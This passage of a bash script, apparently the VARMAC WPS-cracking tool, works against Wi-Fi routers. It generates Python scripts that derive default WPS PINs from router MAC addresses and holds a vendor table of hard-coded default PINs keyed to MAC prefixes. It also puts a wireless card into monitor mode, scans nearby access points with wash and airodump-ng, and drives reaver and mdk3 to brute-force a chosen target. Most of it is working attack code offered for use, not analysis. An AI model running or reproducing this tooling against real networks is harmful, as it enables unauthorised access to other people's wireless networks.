AIREPLAYLOOP_fn
		echo " "
		echo -e "$txtrst Stage II$info - Reaver will run for$yel $LIVE1$info sec."
		sleep $LIVE1

		fi

###########################

echo -e "$txtrst"

PIDREV=$(airmon-old_fn check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q aireplay-ng 
killall -q mdk3
sleep 1
killall -q xterm

clear

}

#~~~~~~~~~~~~~~~End Determine Locked State End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start WPS_DEFAULT Start~~~~~~~~~~~~~~~#

WPS_DEFAULTPINS_fn()
{

until  [ $USE_PIN1TEST == y ] || [ $USE_PIN1TEST == Y ]; do

echo ""
echo -e "$q    Do you wish to use a default or known WPS Pin against the targetAP?"
echo ""
echo -e "$inp  Select$yel (y/Y)$inp to use a specific WPS Pin."
echo ""
echo -e "$yel  -->$inp Enter $yel (n/N)$inp to brute force all 11,000 pins.$yel<--"
echo ""
echo -e "$info  For help on this subject enter$yel (h/H)$info.$txtrst"
echo -e "$warn  !!!WARNING if you select$yel (y/Y)$inp read the help files FIRST!!!$txtrst"

read USE_PIN1

      if  [ $USE_PIN1 == h ] || [ $USE_PIN1 == H ]; then
				clear
				echo ""
				echo ""
				WPS_PINHELP1_fn

				fi

	while true
	do


      if  [ $USE_PIN1 == y ] || [ $USE_PIN1 == Y ] || [ $USE_PIN1 == n ] || [ $USE_PIN1 == N ]; then

echo ""
echo -e "$inp  You entered$yel $USE_PIN1$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"


	elif [ $USE_PIN1 == h ] || [ $USE_PIN1 == H ]; then

echo ""
echo -e "$inp  You entered$yel $USE_PIN1$info for help type $yel (n/N)$inp to try again.$txtrst"

         else

echo ""
echo -e "$warn Error type $yel (n/N)$inp to try again.$txtrst"

			fi

read USE_PIN1TEST


	case $USE_PIN1TEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done
	clear
		done

	if [ $USE_PIN1 == y ] || [ $USE_PIN1 == Y ]; then

###Start Of WPSPIN-1.3 Default Pin Generator Start###
###Start Of Create WPSpin.py And easybox_wps.py  Start###

### WPSpin.py ###
echo '
import sys
 
VERSION    = 1
SUBVERSION = 0
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin might be : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()
' > WPSpin.py

############## easybox_wps.py ##############

echo '#!/usr/bin/env python
import sys, re

def gen_pin (mac_str, sn):
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0]*5+[int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9];
    hpin[1] = k1 ^ sn_int[8];
    hpin[2] = k2 ^ mac_int[9];
    hpin[3] = k2 ^ mac_int[10];
    hpin[4] = mac_int[10] ^ sn_int[9];
    hpin[5] = mac_int[11] ^ sn_int[8];
    hpin[6] = k1 ^ sn_int[7];
    pin = int("%1X%1X%1X%1X%1X%1X%1X" % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

    # WPS PIN Checksum - for more information see hostapd/wpa_supplicant source (wps_pin_checksum) or
	# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc    
    accum = 0
    t = pin
    while (t):
        accum += 3 * (t % 10)
        t /= 10
        accum += t % 10
        t /= 10
    return "%i%i" % (pin, (10 - accum % 10) % 10)

def main():
    if len(sys.argv) != 2:
        sys.exit("usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n")
        
    mac_str = re.sub(r"[^a-fA-F0-9]", "", sys.argv[1])
    if len(mac_str) != 12:
        sys.exit("check MAC format!\n")
        
    sn = "R----%05i" % int(mac_str[8:12], 16)
    print "derived serial number:", sn
    print "SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c" % (mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])        
    print "WPS pin:", gen_pin(mac_str, sn)

if __name__ == "__main__":
    main()
' > easybox_wps.py

###End Of Create WPSpin.py And easybox_wps.py End##############

###START  Default Pin Generation START ##############

clear

PinMAC1=$(echo $MACALNUM | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $MACALNUM | sed 's/://g' | cut -c 1-6)
WPSpin1=`python WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python easybox_wps.py $MACALNUM | grep "WPS pin" | cut -c 10-17`

##############End Of Pin Generation End##############

############## Start Of Review Information ##############

clear
echo ""
#echo -e "$info Listing of posssible WPS Default Pins.$txtrst"
#echo ""
#echo -e "$info  Selected essid:$yel $NAME1"
#echo -e "$info  Selected bssid:$yel $TARGETAP1"
#echo -e "$info You've chosen channel:$yel $CHANNEL1"
#echo ""
#echo -e "$info  Possible WPS Pin1:$yel    $WPSpin1"
#echo -e "$info  Possible WPS Pin2:$yel    $WPSpin2"
#echo -e "$info  Possible easybox Pin:$yel $easybox"

############## Start Of WPSPIN-1.3 by kcdtv for www.crack-wifi.com ##############

ESSID=$(echo $NAME1)
BSSID=$(echo $MACALNUM)

#function below written by antares_145 from crack-wifi.com

FUNC_CHECKSUM(){
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=`expr $PIN '+' $CHECKSUM`
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1 ')' '%' 10 ')'`

RESTE=`expr $ACCUM '%' 10`
 }

CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')

FINBSSID=$(echo $BSSID | cut -d ':' -f4-)

MAC=$(echo $FINBSSID | tr -d ':')

CONVERTEDMAC=$(printf '%d\n' 0x$MAC)

FINESSID=$(echo $ESSID | cut -d '-' -f2)

PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')

CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')

MACESSID=$(echo $PAREMAC$FINESSID)

STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`

PIN=`expr 10 '*' $STRING`

FUNC_CHECKSUM

PINWPS1=$(printf '%08d\n' $PIN)

STRING2=`expr $STRING '+' 8`
PIN=`expr 10 '*' $STRING2`

FUNC_CHECKSUM

PINWPS2=$(printf '%08d\n' $PIN)

STRING3=`expr $STRING '+' 14`
PIN=`expr 10 '*' $STRING3`

FUNC_CHECKSUM

PINWPS3=$(printf '%08d\n' $PIN)

if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&  [[ "$CHECKBSSID" = "04C06F" || "$CHECKBSSID" = "202BC1" || "$CHECKBSSID" = "285FDB" || "$CHECKBSSID" = "80B686" || "$CHECKBSSID" = "84A8E4" || "$CHECKBSSID" = "B4749F" || "$CHECKBSSID" = "BC7670" || "$CHECKBSSID" = "CC96A0" ]] &&  [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];

then

CONVERTEDMACESSID=$(printf '%d\n' 0x$MACESSID)

RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`

STRING4=`expr $RAIZ '+' 7`

PIN=`expr 10 '*' $STRING4`

FUNC_CHECKSUM

PINWPS4=$(printf '%08d\n' $PIN)

echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS4  "
PIN4REAVER=$PINWPS4
else
case $CHECKBSSID in
04C06F | 202BC1 | 285FDB | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0)
echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1  
$info"  Other Possible Pin"$info:$yel $PINWPS2  
$info"  Other Possible Pin"$info:$yel $PINWPS3"
PIN4REAVER=$PINWPS1
;;
001915)
echo -e "$info"  Other Possible Pin"$info:$yel 12345670"
PIN4REAVER=12345670
;;
404A03)
echo -e "$info"  Other Possible Pin"$info:$yel 11866428"
PIN4REAVER=11866428
;;
F43E61 | 001FA4)
echo -e "$info"  Other Possible Pin"$info:$yel 12345670"
PIN4REAVER=12345670
;;
001A2B)
if [[ $ESSID =~ ^WLAN_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$info"  Other Possible Pin"$info:$yel 88478760"
PIN4REAVER=88478760
else
echo -e "PIN POSSIBLE... > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
3872C0)
if [[ $ESSID =~ ^JAZZTEL_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$info"  Other Possible Pin"$info:$yel 18836486"
PIN4REAVER=18836486
else
echo -e "PIN POSSIBLE    > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
FCF528)
echo -e "$info"  Other Possible Pin"$info:$yel 20329761"
PIN4REAVER=20329761
;;
3039F2)
echo -e "  several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
A4526F)
echo -e "  several possible PINs, ranked in order>  
 16538061 88202907 73767053 16702738 43297917 18355604 "
PIN4REAVER=16538061
;;
74888B)
echo -e "  several possible PINs, ranked in order>  
 43297917 73767053 88202907 16538061 16702738 18355604"
PIN4REAVER=43297917
;;
DC0B1A)
echo -e "  several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
5C4CA9 | 62A8E4 | 62C06F | 62C61F | 62E87B | 6A559C | 6AA8E4 | 6AC06F | 6AC714 | 6AD167 | 72A8E4 | 72C06F | 72C714 | 72E87B | 723DFF | 7253D4)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1 "
PIN4REAVER=$PINWPS1
;;
002275)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
08863B)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
001CDF)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
00A026)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
5057F0)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
C83A35 | 00B00C | 081075)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
E47CF9 | 801F02)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
0022F7)
##echo -e "$info"  Other Possible Pin"$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
;;
*)
##echo -e $info"  Other Possible Pin$info:$yel $PINWPS1"
PIN4REAVER=$PINWPS1
echo -e "$txtrst"
;;
esac

fi

##############End WPSPIN-1.3 Default Pin Gen End##############

until  [ $WPS_COMTEST == y ] || [ $WPS_COMTEST == Y ]; do  

echo ""
echo -e "$q    Do you wish to generate a WPS Default pin list for selection"
echo -e "  or enter a known WPS Pin manually?"
echo  ""
echo -e "$inp    To generate a default WPS Pin list enter$yel (s/S)$info."
echo -e "$inp  To enter a known WPS Pin manually enter$yel (m/M)$info.$txtrst"                  
read WPS_COM

	while true
	do

echo ""
echo -e "$inp  You entered$yel $WPS_COM$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read WPS_COMTEST

	case $WPS_COMTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

if [ $WPS_COM == s ] || [ $WPS_COM == S ]; then

until  [ $PIN_SELECTEST == y ] || [ $PIN_SELECTEST == Y ]; do

echo -e "$inp Select the line number of the WPS Default Pin you wish to test.$txtrst"

echo "          BSSID = $MACALNUM"
echo -e "     $info 1) Possible WPS Pin1:$yel    $WPSpin1"
echo -e "     $info 2) Possible WPS Pin2:$yel    $WPSpin2"
echo -e "     $info 3) Possible easybox Pin:$yel $easybox"
echo -e "     $info 4) Other Possible Pin:$yel   $PINWPS1$txtrst"
    
	read PIN_SELECT
	
        case $PIN_SELECT in

	1) WPS_PIN1=$WPSpin1;;
        2) WPS_PIN1=$WPSpin2;;
	3) WPS_PIN1=$easybox;;
	4) WPS_PIN1=$PINWPS1;;
        *) invalid options;;

	esac

	while true
	do

echo ""
echo -e "$inp  You entered$yel $WPS_PIN1$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read PIN_SELECTEST

	case $PIN_SELECTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

		fi #[ $WPS_COM == s ]


			fi  # if [ $USE_PIN1 == y ]

if [ $WPS_COM == m ] || [ $WPS_COM == M ]; then

until  [ $PIN_MANTEST == y ] || [ $PIN_MANTEST == Y ]; do

echo -e "$inp Enter the eight(8) digit WPS PIn you wish to test.$txtrst"

read WPS_PIN1

	WPS_SIZE1=${#WPS_PIN1}

	if [[ $WPS_SIZE1 == 8 ]]; then

	: # Do Nothing

	else

	echo "$warn  WPS_PIN1=$WPS_PIN1 MUST eight(8) numbers in length."

         fi

	case $WPS_PIN1 in

	''|*[!0-9]*) echo WPS_PIN1=$WPS_PIN1 Error MUST be a number. ;;
  	*) echo :  ;;

	esac

	while true
	do

echo ""
echo -e "$inp  You entered$yel $WPS_PIN1$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read PIN_MANTEST

	case $PIN_MANTEST in
	y|Y|n|N) break ;;
	~|~~)
	exit
	echo Aborting - 
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

			fi

}

#~~~~~~~~~~~~~~~End WPS_DEFAULT End~~~~~~~~~~~~~~~#

SELECT_DEVICE_fn

BOOST_DEVICE_fn

SELECT_MONITOR_fn

sleep 1
ifconfig $DEV down
sleep .1
iwconfig $DEV mode monitor
sleep .1
ifconfig $DEV up
sleep .1
#ifconfig $MON down
#sleep .1
#iwconfig $MON mode monitor
#sleep .1
#ifconfig $MON up


# Make directory for temporary wash scans

if [ ! -d "VARMAC_WASH" ]; then

    mkdir -p -m 700 VARMAC_WASH;

	fi

# Clear any files on the temporary folder

rm -rfv VARMAC_WASH/* &> /dev/null


######make directory for reaver output #############

if [[ ! -d "VARMAC_LOGS" ]]; then

    mkdir -p -m 700 VARMAC_LOGS;

	fi

##################end make dir######################

######make directory for reaver output and warn #############

clear

if [[ ! -d "/root/VARMAC_CONFIG" ]]; then

	mkdir -p -m 700 VARMAC_CONFIG;

        fi

############Check to see if VARMAC_CONFIG is empty###########

############ End Check to see if VARMAC_CONFIG is empty###########

CONFIG_WRITE

#### Switch for Advanced Monitor

OVERRIDE_MDK3=n

#########WASH TARGET SCAN##############

echo -e "$info    Running wash scan target for targetAP selection."

#xterm -g 100x30-1+1 -T "wash" -e "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

	if  [[ $REAVER_TYPE == 1 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $MON -C 2>&1 | tee VARMAC_WASH/wash01.txt" &

			fi

	if  [[ $REAVER_TYPE == 2 ]]; then

xterm -g 100x30-1+1 -T "wash target scan" -e "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

			fi

sleep 1

xterm -g 80x10-1+400 -T "Airodump-ng AP Selection " -e "airodump-ng $MON" &

###########Manual Entry HIDDEN ESSID Handeling##########

clear
until  [ $AP_HIDDENTEST == y ] || [ $AP_HIDDENTEST == Y ]; do 

echo ""
echo -e "$q                         FOR AUTOMATIC ENTRY"
echo "" 
echo -e "$inp    When scan is complete and targetAP's seen enter$yel (y/Y)$inp to continue...$txtrst"      
echo -e "$info   Program will display AP list and load selected target data automatically."

echo  ""
echo -e "$q                          FOR MANUAL ENTRY"
echo -e "$info                          (Special  Cases)"
echo ""
echo -e "$info    If targetAP has a hidden ESSID(i.e. no AP name seen) or,"
echo -e "$info  targetAP NOT FOUND you may enter information manually."
echo -e "$inp  Enter$yel (m/M)$inp to enter the AP name, mac address and channel manually.$txtrst"
echo ""
echo -e "$yel   [y/Y]$inp To select targetAP from a wash  scan list of APs seen enter:$yel [y/Y]"
echo "" 
echo -e "$yel   [m/M]$inp To enter targetAP data manually (i.e. special cases) select:$yel [m/M]$txtrst"
echo ""
echo "     Enter y/Y or m/M"

read AP_HIDDEN

	while true
	do

echo ""
echo -e "$info    You have chosen$yel $AP_HIDDEN$info."
echo ""
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read AP_HIDDENTEST

	case $AP_HIDDENTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

###Manual Select AP Name, mac,channel###

if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

	echo ""
	echo -e "$inp    Enter the hidden name of the targetAP."
	echo -e "$info  AP names with spaces DO NOT require parentasis(i.e.Wifi Home).$txtrst"
	read NAME1
	echo ""
	echo -e "$inp    Enter the mac address of the targetAP.$txtrst"
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handeling exists for this entry.$txtrst"
	read TARGETAP1

	MACERROR_HANDEL_fn

	echo ""
	echo -e "$inp    Enter the$yel channel$inp of the targetAP."
	echo -e "$info  Enter$yel zero(0)$info if you wish reaver to channel hop$txtrst"
	echo -e "$info  searching for the AP.$txtrst"
	read CHANNEL_MAN
		

	MANUAL_SELECT_fn

	fi  #if [[ $AP_HIDDEN == m


#Write
#if [ $AP_HIDDEN == m ] || [ $AP_HIDDEN == M ]; then

#Need ESSIDFILE Variable


#		fi


###Manual Entry HIDDEN ESSID Handeling###

#### Drop down menu data entry Target AP seen ####

if [ $AP_HIDDEN == y ] || [ $AP_HIDDEN == Y ]; then

cat < VARMAC_WASH/wash01.txt | awk -F' ' '{ if(($5 == "No") || ($5 == "Yes")) {print $1 " " $2 " " substr($0, index($0,$6))}}' > VARMAC_WASH/wash02.txt

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $1}' > VARMAC_WASH/MAC_LIST.txt

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $2}' > VARMAC_WASH/CHANNEL_LIST.txt




#cat < VARMAC_WASH/wash02.txt | awk -F' ' '{print $3" "$4" "$5" "$6" "$7}' > VARMAC_WASH/APNAME_LIST.txt

if [[ $REVPIX_TYPE == 1 ]]; then

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{$1=$2=""; print $0 }' | sed -e 's/^[ \t]*//' | sed -e 's/ /_/g' > VARMAC_WASH/APNAME_LIST.txt

	fi

#Change 8 Skip Vendor

if [[ $REVPIX_TYPE == 2 ]]; then

cat < VARMAC_WASH/wash02.txt | awk -F' ' '{$1=$2=$3=""; print $0 }' | sed -e 's/^[ \t]*//' | sed -e 's/ /_/g' > VARMAC_WASH/APNAME_LIST.txt

	fi

sleep 2

until  [ $WASHNAMETEST == y ] || [ $WASHNAMETEST == Y ]; do  

echo -e "$txtrst "

# Make file list in folder as variable
WASHNAME=$(cat VARMAC_WASH/APNAME_LIST.txt | nl -ba -w 1  -s ': ')
clear
echo ""
echo -e "$info TargetAPs found by wash.$txtrst"
echo " "
echo "$WASHNAME" | sed 's/^/       /'
echo ""
echo -e "$yel      !!!$info A specific config file will be written for each target$yel !!!"
echo ""
echo -e "$info     When the targetAP is selected, the script will write a configuration"
echo -e "$info  file to the$yel /root/VARMAC_CONFIG/$info folder. The file name will be"
echo -e "$info  the AP name$yel(ESSID)$info followed by the mac address$yel(BSSID)$info. If the file exists,"
echo -e "$info  the file will$yel NOT$info be overwritten."
echo -e "$info     Using individual files for each target will avoid conflicts with reaver"
echo -e "$info  and help keep attack parameters consistent. For example, using and"
echo -e "$info  then not using $yel --dh-small/-S$info will cause reaver to reset the pin"
echo -e "$info  count. The entire attack will be restarted and all previous work will be"
echo -e "$info  lost.$txtrst"
echo ""

echo ""
read  -p "   Enter Line Number of Selected TargetAP Here: " grep_Line_Number

echo -e "$txtrst"
NAME1=$(cat VARMAC_WASH/APNAME_LIST.txt | sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

NAME1=$(echo $NAME1 | xargs -0)

TARGETAP1=$(cat VARMAC_WASH/MAC_LIST.txt | sed -n ""$grep_Line_Number"p")

# junk dna keep command for later use but rem out
# CHANNEL_INFO=$(cat VARMAC_WASH/CHANNEL_LIST.txt | sed -n ""$grep_Line_Number"p")
echo ""

	while true
	do

echo ""
echo ""
echo -e "$info    You have chosen:"
echo ""
echo -e "$info      1. $yel $NAME1$info as the targetAPs' name."
echo ""
echo -e "$info      2. $yel $TARGETAP1$info as the targetAPs' mac address."
echo ""
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read WASHNAMETEST

	case $WASHNAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"
	rm configlist.txt

	done
		done

			fi #if [[ $AP_HIDDEN == y

####END Drop down menu data entry END####

sleep 2
killall -q wash
killall -q airodump-ng
sleep 1
killall -q xterm

MACALNUM=`echo "$TARGETAP1" | tr -d -c ".[:alnum:]"`

####Write Configfile to folder with ESSID NAME and MAC add as file name

#Handel ESSID names w/ spaces give variable name
# Remove trailing white spaces leaves spaces between names intact

########### Remove Spaces in Names for file names #########

CON_FILENAME1=$(echo $NAME1 | xargs -0)

########### Remove Spaces in Names for file names #########

CON_FILENAME1=${CON_FILENAME1// /_}

CONFIG_WRITE

### variable for reaver output scan ### 

EAPOL="[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response"

###End variable for reaver output scan End###

##########source file names and existance###############

until  [ $SOURCENAMETEST == y ] || [ $SOURCENAMETEST == Y ]; do  

echo -e "$txtrst "
ls /root/VARMAC_CONFIG | tee configlist.txt &> /dev/null
clear

# Make file list in folder a variable
configfiles=$(cat configlist.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Configuration files listed in the$yel VARMAC_CONFIG$info folder.$txtrst"
echo " "
echo "$configfiles" | sed 's/^/       /'
echo ""
echo -e "$inp     Select the$yel config file$inp to be used.$txtrst"
echo -e "$info  A Configuration file$yel $CON_FILENAME1-$MACALNUM$info has been made for use"
echo -e "$info  with this target BUT any config file listed can be used."
echo -e "$info  After selection the config file parameters will appear. You can review"
echo -e "$info  settings and make changes which will be written to the file choosen."
echo ""
echo -e "     Once the program is running, open the config file with$yel leafpad$info,"
echo -e "  make any changes and save. The config file is loaded at the start of"
echo -e "  Stages II, III & IV.$txtrst"
echo ""
read  -p "   Enter Line Number of Config File Here: " grep_Line_Number

echo -e "$txtrst"
SOURCENAME=$(cat configlist.txt | sed -n ""$grep_Line_Number"p")
echo ""

	while true
	do

#leafpad /root/VARMAC_CONFIG/$SOURCENAME &
echo ""
echo -e "$info    You have chosen$yel $SOURCENAME$info as your configuration file." 
echo -e "$inp Enter$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read SOURCENAMETEST

	case $SOURCENAMETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"
	rm -f configlist.txt
	done

		done

rm -f configlist.txt


### Load configuration file ###

until  [ $SOURCEGOODTEST == y ] || [ $SOURCEGOODTEST == Y ]; do

#source /root/VARMAC_CONFIG/$SOURCENAME

CONFIG_ADJUST_fn
sleep 2
#reload after changes to push thru error routines
chmod 755 /root/VARMAC_CONFIG/$SOURCENAME

#/root/VARMAC_CONFIG/$SOURCENAME

while true

do

###Start config file error handeling Start###

#Error Handeling CHANNEL1=0

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]; then
        echo -e "$txtrst"
	echo "  ERROR CHANNEL1=$CHANNEL1"
	echo "    For operations against WPS Locked Routers"
        echo "  set channel to zero(0) Only."
        echo "    For operations against routers where the WPS system"
	echo "  is NOT Locked - setting a specific channel is optional."
	echo ""
		fi

if [[ $CHANNEL1 -ge 0 && $CHANNEL1 -le 14 ]]; then

	: # Do Nothing

	else

	echo "  ERROR CHANNEL1=$CHANNEL1 MUST be set from 0 to 14 Only"

		fi

# Error Handeling USE_R1=y

if [[ $USE_R1 == n  || $USE_R1 == N || $USE_R1 == y || $USE_R1 == Y ]]; then

         : # Do Nothing	
else      
	echo "  ERROR USE_R1=$USE_R1 MUST be set to n or N or y or Y ONLY!"

		fi

# Error Handeling RX1=y

if [[ $USE_R1 == y || $USE_R1 == Y ]]; then

    if [[ $RX1 > 0 ]]; then

	: # Do Nothing

	else

	echo "  ERROR RX1=$RX1 MUST a number greater than 0."

	fi
		fi	

# Error Handeling RY1=y

if [[ $USE_R1 == y || $USE_R1 == Y ]]; then

    if [[ $RY1 > 0 ]]; then

	: # Do Nothing

	else

	echo "  ERROR RY1=$RY1 MUST be a number greater than 0."

	fi
		fi	

# Error Handeling LIVE1

case $LIVE1 in

''|*[!0-9]*) echo ERROR LIVE1=$LIVE1 MUST be a number greater then 0. ;;
#  *) echo :  ;;

	esac

# Error Handeling USE_LONG1

if [[ $USE_LONG1 == n || $USE_LONG1 == N || $USE_LONG1 == y || $USE_LONG1 == Y ]]; then

        : # Do nothing
else
	echo "  ERROR USE_LONG1=$USE_LONG1 MUST be set to n or N or y or Y ONLY."

		fi

# Error Handeling = MDKTYPE1=3

if [[ $MDKTYPE1 -gt 15 ]]; then

	echo "  ERROR MDKTYPE1=$MDKTYPE1 MUST be a number 1 thru 15."

    fi

case $MDKTYPE1 in

	''|*[!0-9]*) echo ERROR MDKTYPE1=$MDKTYPE1 MUST be a number 1 thru 15. ;;
	#  *) echo :  ;;

	esac

# Error handeling MDKLIVE=

case $MDKLIVE in

	''|*[!0-9]*) echo ERROR MDKLIVE=$MDKLIVE  MUST be a number. ;;
	#  *) echo :  ;;

	esac

# Error handeling PAUSE=

case $PAUSE in

	''|*[!0-9]*) echo ERROR PAUSE=$PAUSE MUST be a number. ;;
	#  *) echo :  ;;

	esac

# Error Handeling REAVER_COUNT=

if [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] || [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]]; then

	: # Do nothing

else
	echo "  ERROR REAVER_COUNT=$REAVER_COUNT MUST be set to n or N or y or Y ONLY."

		fi

if [[ $MDK3_COUNT == n || $MDK3_COUNT == N || $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

	: # Do nothing

else

	echo "  ERROR MDK3_COUNT=$MDK3_COUNT MUST be set to n or N or y or Y ONLY."

		fi

#Error Handeling WASH_COUNT=

if [[ $WASH_COUNT == n || $WASH_COUNT == N ]] || [[ $WASH_COUNT == y || $WASH_COUNT == Y ]]; then

	: # Do nothing

else

